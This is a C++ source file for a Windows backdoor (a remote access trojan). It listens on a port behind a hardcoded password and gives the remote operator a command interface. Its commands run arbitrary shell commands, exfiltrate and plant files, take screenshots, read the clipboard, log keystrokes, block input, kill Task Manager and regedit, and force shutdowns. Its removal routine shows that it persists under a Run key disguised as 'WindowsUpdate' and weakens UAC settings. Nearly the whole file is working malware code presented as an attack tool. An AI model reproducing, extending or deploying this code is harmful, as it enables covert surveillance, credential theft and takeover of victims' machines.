#define _WIN32_WINNT 0x0501

// mingw thread fix
#include "mingw.thread.h"

#include <iostream>
#include <algorithm>
#include <string>
#include <fstream>
#include <sstream>

#include <stdio.h> 
#include <stdlib.h>
#include <ws2tcpip.h>
#include <unistd.h>
#include <wininet.h>
#include <windows.h>
#include <tlhelp32.h>
#include <shlwapi.h>
#include <math.h>

#ifdef DEBUG
#	define D(x) x
#else
#	define D(x)
#endif

// obtained from the netcat source code
#define BIGSIZ    8192 // big buffers
#define SMALLSIZ  256  // small buffers, hostnames, etc
#define SIGNALSIZ 16   // for enter/confirmation

#define PORT_MAIN      31337  // meterpreter port
#define PORT_SHELL     4444   // shell port
#define PORT_SEND      1337   // port for dumping/sending files to remote (netcat)
#define PORT_RECV      707    // port for receiving files on target (server)
#define PORT_KEYLOGGER 6464   // keylogger/send keystrokes to remote

std::string password = "admin";
bool running = true;

#include "print.cpp"
#include "get.cpp"
#include "bmp.cpp"
#include "createChildSocket.cpp"
#include "run.cpp"
#include "sendrecv.cpp"
#include "keylogger.cpp"
#include "sendkey.cpp"
#include "jokes.cpp"


int main(int argc, char* argv[]) {
	
	// initialize winsock
	WSADATA wsData;
	if (WSAStartup(MAKEWORD(2, 2), &wsData) != 0)
		 { D(echo("[-] unabel to initialize winsock", true)); return 1; }
	else { D(echo("[+] initialized winsock"));                          }
	
	// set CWD for restart
	const char* cwd = getcwd(NULL, 0);
	bool enablePS1 = false;
	
	/// open port for restarting
	
	// get port string
	int port = PORT_MAIN;
	std::string port_s = std::to_string(port);
	
	std::string lastCmd = "";
	
	while (running) {
		
		// RESET CWD
		chdir(cwd);
		echo(getCD());
		
		// create socket
		SOCKET listening = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, 0, 0, WSA_FLAG_OVERLAPPED);
		if (listening == INVALID_SOCKET) { D(echo("[-] PORT[" + port_s + "] unabel to create socket", true)); Sleep(2000); continue; }
		else                             { D(echo("[+] PORT[" + port_s + "] created socket"));                                       }
		
		// bind socket to ip:port
		sockaddr_in hint;
		hint.sin_family = AF_INET;
		hint.sin_port = htons(port);
		hint.sin_addr.S_un.S_addr = INADDR_ANY; // could also use inet_pton
		bind(listening, (sockaddr*)&hint, sizeof(hint));
		listen(listening, SOMAXCONN); // tell winsock the socket is for listening
		
		// wait for a connection
		sockaddr_in client;
		int clientSize = sizeof(client);
		D(echo("[*] PORT[" + port_s + "] listening for a connection..."));
		SOCKET clientSocket = accept(listening, (sockaddr*)&client, &clientSize); // wait for connection
		if (clientSocket == INVALID_SOCKET) { D(echo("[-] PORT[" + port_s + "] unabel to start listening", true)); Sleep(2000); continue; }
	
		// get/print client info
		D(
			char* ClientIP = inet_ntoa(client.sin_addr);
			int ClientPort = ntohs(client.sin_port);
			echo("[+] PORT[" + port_s + "] client connected: " + std::string(ClientIP) + ":" + std::to_string(ClientPort));
		);
		
		// close the listening socket
		closesocket(listening);
		
		#ifndef DEBUG
		
		justSend(clientSocket, "[?] password: ", false);
		
		D(echo("[?] asking for password (password is \"" + password + "\")"));
		
		// recv password
		char passBuf[SMALLSIZ];
		ZeroMemory(passBuf, SMALLSIZ);
		/*int bytesReceived =*/ recv(clientSocket, passBuf, SMALLSIZ - 1, 0);
		std::string spassBuf(passBuf);
		spassBuf.erase(std::remove(spassBuf.begin(), spassBuf.end(), '\n'), spassBuf.end()); // remove new lines from string
		
		// password check
		if (spassBuf == password) {
			D(echo("[+] user authentication successful"));
		} else {
			D(echo("[-] user authentication failed (client entered: " + spassBuf + ")"));
			D(echo("[-] restarting..."));
			echoNsend(clientSocket, "[-] wrong password entered.");
			closesocket(clientSocket);
			continue;
		}
		
		#endif
		
		// send server start msg
		std::string msg = 
			"\n"
			"     ....................\n"
			"...::: HACK THE PLANET! :::...\n"
			"``````````````````````````````\n"
			"USERNAME...: " + std::string(getenv("USERNAME")) + "\n"
			"USERDOMAIN.: " + std::string(getenv("USERDOMAIN")) + "\n"
		;
		
		if (send(clientSocket, msg.c_str(), msg.size(), 0) == SOCKET_ERROR) {
			getSendErr();
			continue;
		}
		
		D(echo("[+] reverse shell started"));
		
		char buf[BIGSIZ];
		while (true) {
			// same as memset(buf, 0, BIGSIZ);
			ZeroMemory(buf, BIGSIZ); // clear buffer
			
			// send PS1
			if (enablePS1) {
				std::string cd = "[" + std::string(getcwd(NULL, 0)) + "]$ ";
				if (send(clientSocket, cd.c_str(), cd.size(), 0) == SOCKET_ERROR) {
					getSendErr();
					break;
				}
			}
			
			// wait for client to send data
			int bytesReceived = recv(clientSocket, buf, BIGSIZ - 1, 0);
			
			// check if client has disconnected
			if (bytesReceived == SOCKET_ERROR || bytesReceived == 0) { break; }
	
			// convert received buffer to string & remove newlines
			std::string command(buf);
			command.erase(std::remove(command.begin(), command.end(), '\n'), command.end()); 
			
			if (command == ".") { command = lastCmd; }
			
			// output
			D(echo("[>] " + command));
			
			lastCmd = command;
			
			if (command == "helpme") { echoNsend(clientSocket, getHelp()); continue; }
	
			// enable / disable ps1
			if (command == "ps1on")  { enablePS1 = true;  continue; }
			if (command == "ps1off") { enablePS1 = false; continue; }
			
			// pwd
			if (command == "pwd") { echoNsend(clientSocket, std::string(getcwd(NULL, 0)) + "\n", true); continue; }
			
			// > cd <path> // change path/cwd/cd
			if (command.substr(0, 2) == "cd") {
				
				if (command.size() < 4) { echoNsend(clientSocket, "USAGE: cd <path>", true); continue; }
				
				std::string dir = command.substr(3);
				
				int ret = chdir(dir.c_str());
				
				if      (ret ==  0) { echoNsend(clientSocket, getCD()); }
				else if (ret == -1) { echoNsend(clientSocket, "[-] can't find dir: " + dir); }
				continue;
			}
			
			// custom cd
			if (command == "temp")    { chdir(getenv("TEMP"));                                                          echoNsend(clientSocket, getCD()); continue; }
			if (command == "appdata") { chdir(getenv("APPDATA"));                                                       echoNsend(clientSocket, getCD()); continue; }
			if (command == "dx")      { chdir(("C:\\Users\\" + std::string(getenv("USERNAME")) + "\\Desktop").c_str()); echoNsend(clientSocket, getCD()); continue; }
			
			/// make better send (chop up the file and send it in packets)
			/// better memory managment when loading files (...)
			/// check how much mem is free before alloc
			// send file
			if (command.substr(0, 2) == "sf") {
				
				if (command.size() < 4) { echoNsend(clientSocket, "USAGE: sf <filePath>", true); continue; }
				
				std::thread t1(sendFile, &clientSocket, command.substr(3), false);
				t1.detach();
				
				continue;
			}
			
			// receive file
			if (command.substr(0, 2) == "rf") {
				
				if (command.size() < 4) { echoNsend(clientSocket, "USAGE: rf <filePath>", true); continue; }
				
				std::thread t1(recvFile, &clientSocket, command.substr(3));
				t1.detach();
				
				continue;
			}
			
			// take screenshot then send file
			if (command == "sssf") {
				std::string sssf_path = std::string(getenv("TEMP")) + "\\temp1337.tmp";
				CreateBMPFile(sssf_path.c_str(), screenshot());
				std::thread t1(sendFile, &clientSocket, sssf_path, true);
				t1.detach();
				continue;
			}
			
			// take screenshot
			if (command.substr(0, 2) == "ss") {
				if (command.size() < 4) { echoNsend(clientSocket, "USAGE: ss <imagePath>.bmp", true); continue; }
				std::string filePath = command.substr(3);
				CreateBMPFile(filePath.c_str(), screenshot());
				continue;
			}
			
			// get clipboard text
			if (command == "xclip") { echoNsend(clientSocket, GetClipboardText()); continue; }
			
			// get public/external ip
			if (command == "exip") { echoNsend(clientSocket, getExip()); continue; }
			
			if (command == "id")     { command = "run whoami"; }
			if (command == "ktm")    { command = "run taskkill /F /IM taskmgr.exe"; }
			if (command == "kre")    { command = "run taskkill /F /IM regedit.exe"; }
			if (command == "disks")  { command = "run wmic logicaldisk get name"; }
			if (command == "titles") { command = "run TASKLIST /v /fo list | find /i \"window title\" | find /v \"N/A\""; }
			
			// shutdown pc
			if (command == "poweroff") {
				runCmdBg("run shutdown /s /t 1");
				running = false;
				break;
			}
			
			// restart pc
			if (command == "reboot") {
				runCmdBg("run shutdown /r /t 1");
				running = false;
				break;
			}
			
	
			/// add msg box customisation
			// open msgbox
			if (command.substr(0, 3) == "msg") {
				
				if (command.size() < 5) { echoNsend(clientSocket, "USAGE: msg <text>", true); continue; }
				
				std::string msg = command.substr(4);
				
				std::thread t1([&clientSocket, msg](){
					int ret = MessageBox(NULL, msg.c_str(), "", MB_OK | MB_SYSTEMMODAL);
					switch (ret) {
						case IDABORT   : echoNsend(clientSocket, "[*] msg response: ABORT");    break;
						case IDCANCEL  : echoNsend(clientSocket, "[*] msg response: CANCEL");   break;
						case IDCONTINUE: echoNsend(clientSocket, "[*] msg response: CONTINUE"); break;
						case IDIGNORE  : echoNsend(clientSocket, "[*] msg response: IGNORE");   break;
						case IDNO      : echoNsend(clientSocket, "[*] msg response: NO");       break;
						case IDOK      : echoNsend(clientSocket, "[*] msg response: OK");       break;
						case IDRETRY   : echoNsend(clientSocket, "[*] msg response: RETRY");    break;
						case IDTRYAGAIN: echoNsend(clientSocket, "[*] msg response: TRYAGAIN"); break;
						case IDYES     : echoNsend(clientSocket, "[*] msg response: YES");      break;
					}
					
				});
				t1.detach();
				
				continue;
			}
			
			/// add more keys
			// sendkeys - simulate key presses
			if (command.substr(0, 2) == "sk") {
				
				if (command.size() < 4) {
					echoNsend(clientSocket, "USAGE: sk <stringToSend>", true);
					echoNsend(clientSocket, getSendkeyHelp(), true);
					continue;
				}
				
				sendkey(command.substr(3));
				
				continue;
			}
			
			if (command.substr(0, 9) == "keylogger") {
				echoNsend(clientSocket, "[*] starting keylogger thread...");
				std::string filePath = command.size() > 11 ? command.substr(10) : "";
				std::thread t1(keylogger, filePath, false);
				t1.detach();
				continue;
			}
			if (command.substr(0, 11) == "cleanlogger") {
				echoNsend(clientSocket, "[*] starting cleanlogger thread...");
				std::string filePath = command.size() > 13 ? command.substr(12) : "";
				std::thread t1(keylogger, filePath, true);
				t1.detach();
				continue;
			}
			if (command == "dumplogger") {
				echoNsend(clientSocket, keylogger_keys.str());
				continue;
			}
			if (command == "stoplogger") {
				echoNsend(clientSocket, "[*] stopping keylogger...");
				keylogger_running = false;
				continue;
			}
			if (command == "clearlogger") {
				echoNsend(clientSocket, "[*] clearing keylogger buffer...");
				if (keylogger_running) {
					echoNsend(clientSocket, "[-] you must \"stoplogger\" before clearing it", true);
				}
				else {
					keylogger_keys.str(std::string());
					keylogger_keys.clear();
					echoNsend(clientSocket, "[+] cleared keylogger buffer");
				}
				continue;
			}
			
			if (command.substr(0, 13) == "livekeylogger") {
				std::string filePath = command.size() > 15 ? command.substr(14) : "";
				std::thread t1(liveKeylogger, &clientSocket, filePath, false);
				t1.detach();
				continue;
			}
			if (command.substr(0, 15) == "livecleanlogger") {
				std::string filePath = command.size() > 17 ? command.substr(16) : "";
				std::thread t1(liveKeylogger, &clientSocket, filePath, true);
				t1.detach();
				continue;
			}
			
	
			// play wav
			if (command.substr(0, 7) == "playwav") {
				std::string filePath = command.substr(8);
				PlaySound(filePath.c_str(), NULL, SND_ASYNC);
				continue;
			}
			
			// loop wav file
			if (command.substr(0, 7) == "loopwav") {
				std::string filePath = command.substr(8);
				PlaySound(filePath.c_str(), NULL, SND_ASYNC | SND_LOOP);
				continue;
			}
			
			// stop wav
			if (command == "stopwav") { PlaySound(0, 0, 0); continue; }
	
			// play mp3
			if (command.substr(0, 7) == "playmp3") {
				std::string filePath = command.substr(8);
				mciSendString(("open " + filePath + " type mpegvideo alias mp3").c_str(), NULL, 0, NULL);
				mciSendString("play mp3", NULL, 0, NULL);
				continue;
			}
			
			if (command == "loopmp3")   { mciSendString("play mp3 repeat", NULL, 0, NULL); continue; }                                     // enable looping
			if (command == "pausemp3")  { mciSendString("pause mp3", NULL, 0, NULL); continue; }                                           // pause mp3
			if (command == "resumemp3") { mciSendString("resume mp3", NULL, 0, NULL); continue; }                                          // resume mp3
			if (command == "stopmp3")   { mciSendString("stop mp3", NULL, 0, NULL); mciSendString("close mp3", NULL, 0, NULL); continue; } // stop mp3
			
			if (command == "bion") {
				if (!blockInput_bool) {
					std::thread t1(blockInput, &clientSocket);
					t1.detach();
					echoNsend(clientSocket, "[*] enabled thread: block input");
				} else {
					echoNsend(clientSocket, "[*] thread already running...");
				}
				continue;
			}
			if (command == "bioff") {
				blockInput_bool = false;
				echoNsend(clientSocket, "[*] disabled thread: block input");
				continue;
			}
			
			
			if (command == "atkon") {
				if (!disableADMIN_bool) {
					std::thread t1(disableADMIN, &clientSocket);
					t1.detach();
					echoNsend(clientSocket, "[*] enabled thread: admin tools killer");
				} else {
					echoNsend(clientSocket, "[*] thread already running...");
				}
				continue;
			}
			if (command == "atkoff") {
				disableADMIN_bool = false;
				echoNsend(clientSocket, "[*] disabled thread: admin tools killer");
				continue;
			}
			
			// fuck with mouse lol
			if (command == "cmon") {
				if (!fuckWithMouse_bool) {
					std::thread t1(fuckWithMouse, &clientSocket);
					t1.detach();
					echoNsend(clientSocket, "[*] enabled thread: mouse circles");
				} else {
					echoNsend(clientSocket, "[*] thread already running...");
				}
				continue;
			}
			if (command == "cmoff") {
				fuckWithMouse_bool = false;
				echoNsend(clientSocket, "[*] disabled thread: mouse circles");
				continue;
			}
			
			// keyboard disco
			if (command == "kbdon") {
				if (!keyboardDisco_bool) {
					std::thread t1(keyboardDisco, &clientSocket);
					t1.detach();
					echoNsend(clientSocket, "[+] enabled thread: keyboard disco");
				} else {
					echoNsend(clientSocket, "[*] thread already running...");
				}
				continue;
			}
			if (command == "kbdoff") {
				keyboardDisco_bool = false;
				echoNsend(clientSocket, "[*] stopping keyboard disco thread...");
				continue;
			}
			
			
			
			// restart connection
			if (command == "exit") { break; }
			
			// quit reverse shell (program)
			if (command == "stop") {
				
				#ifndef DEBUG
				
					justSend(clientSocket, "[?] Stop program? [y/N]: ", false);
					
					// recv confirmation
					char buf[SIGNALSIZ];
					ZeroMemory(buf, SIGNALSIZ);
					/*int bytesReceived =*/ recv(clientSocket, buf, SIGNALSIZ - 1, 0);
					std::string buf_s(buf);
					buf_s.erase(std::remove(buf_s.begin(), buf_s.end(), '\n'), buf_s.end()); // remove new lines from string
					
					if (buf_s != "y") { continue; }
					
				#endif
					
				echoNsend(clientSocket, "[+] quitting...");
				running = false;
				break;
			}
			
			if (command == "removebd") {
				
				#ifndef DEBUG
				
					justSend(clientSocket, "[?] Remove program? [y/N]: ", false);
					
					// recv confirmation
					char buf[SIGNALSIZ];
					ZeroMemory(buf, SIGNALSIZ);
					/*int bytesReceived =*/ recv(clientSocket, buf, SIGNALSIZ - 1, 0);
					std::string buf_s(buf);
					buf_s.erase(std::remove(buf_s.begin(), buf_s.end(), '\n'), buf_s.end()); // remove new lines from string
					
					if (buf_s != "y") { continue; }
				#endif
				
				// remove startup path
				echoNsend(clientSocket, "del HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\WindowsUpdate");
				echoNsend(clientSocket, "    RegOpenKeyEx   ... ", false, false);
				HKEY hKey;
				LONG openRes = RegOpenKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_ALL_ACCESS, &hKey);
				if (openRes == ERROR_SUCCESS) { echoNsend(clientSocket, "SUCCESS"); }
				else                          { echoNsend(clientSocket, "FAILED");  }
				echoNsend(clientSocket, "    RegDeleteValue ... ", false, false);
				LONG setRes = RegDeleteValue(hKey, TEXT("WindowsUpdate"));
				if (setRes == ERROR_SUCCESS) { echoNsend(clientSocket, "SUCCESS"); }
				else                         { echoNsend(clientSocket, "FAILED");  }
				echoNsend(clientSocket, "    RegCloseKey    ... ", false, false);
				LONG closeOut = RegCloseKey(hKey);
				if (closeOut == ERROR_SUCCESS) { echoNsend(clientSocket, "SUCCESS"); }
				else                           { echoNsend(clientSocket, "FAILED");  }
				
				// repair UAC
				auto setZeroReg = [&](const char* key, DWORD data) {
					echoNsend(clientSocket, "    RegOpenKeyEx  ... ", false, false);
					HKEY hKey;
					LONG openRes = RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 0, KEY_ALL_ACCESS, &hKey);
					if (openRes == ERROR_SUCCESS) { echoNsend(clientSocket, "SUCCESS"); }
					else                          { echoNsend(clientSocket, "FAILED");  }
					echoNsend(clientSocket, "    RegSetValueEx ... ", false, false);
					LONG setRes = RegSetValueEx(hKey, TEXT(key), 0, REG_DWORD, (const BYTE*)&data, sizeof(data));
					if (setRes == ERROR_SUCCESS) { echoNsend(clientSocket, "SUCCESS"); }
					else                         { echoNsend(clientSocket, "FAILED");  }
					echoNsend(clientSocket, "    RegCloseKey   ... ", false, false);
					LONG closeOut = RegCloseKey(hKey);
					if (closeOut == ERROR_SUCCESS) { echoNsend(clientSocket, "SUCCESS"); }
					else                           { echoNsend(clientSocket, "FAILED");  }
				};
				
				echoNsend(clientSocket, "EnableLUA = 1");                  setZeroReg("EnableLUA", 1);
				echoNsend(clientSocket, "ConsentPromptBehaviorAdmin = 2"); setZeroReg("ConsentPromptBehaviorAdmin", 2);
				echoNsend(clientSocket, "PromptOnSecureDesktop = 1");      setZeroReg("PromptOnSecureDesktop", 1);
				
				echoNsend(clientSocket, "[*] starting backdoor remover...");
				
				// start cmd to remove bd
				std::string appdataPath = getenv("APPDATA");
				chdir(appdataPath.c_str());
				runCmdBg("timeout /t 3 && rd /q /s \"" + appdataPath + "\\WindowsUpdate\"");
				
				echoNsend(clientSocket, "[+] quitting...");
				running = false;
				break;
			}
			
			// if input is nothing do nothing
			if (command.empty()) { continue; }
			
			if (command == "shell") {
				std::thread t1(startCMD, &clientSocket);
				t1.detach();
				continue;
			}
			
			// run cmd
			if (command.substr(0, 3) == "run") {
				std::string cmd = command.substr(4);
				runCmd(clientSocket, cmd);
				continue;
			}
			
			runCmd(clientSocket, command);
		}
	
		// close socket
		D(echo("[*] PORT[" + port_s + "] closing socket..."));
		closesocket(clientSocket);
		D(echo("[*] PORT[" + port_s + "] closed socket"));
	}
	
	// cleanup winsock
	WSACleanup();
	
	return 0;
}
